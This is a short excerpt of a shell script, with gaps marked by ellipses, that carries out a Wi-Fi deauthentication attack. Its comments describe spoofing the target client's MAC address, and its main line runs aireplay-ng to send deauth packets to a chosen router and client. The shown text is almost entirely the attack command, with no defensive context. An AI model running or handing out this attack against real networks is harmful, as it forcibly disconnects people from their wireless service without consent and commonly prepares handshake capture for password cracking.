...
# Aireplay-ng spooks our MAC address to the target cient's MAC address (i.e. pretend to be him) and requests to be disconnected from the router
...
iwconfig wlan0 down							# Bring the network interface down
...
aireplay-ng --deauth $packets -a $host_mac -c $client_mac wlan0		# Aireplay sends the deauth packets to the host and client
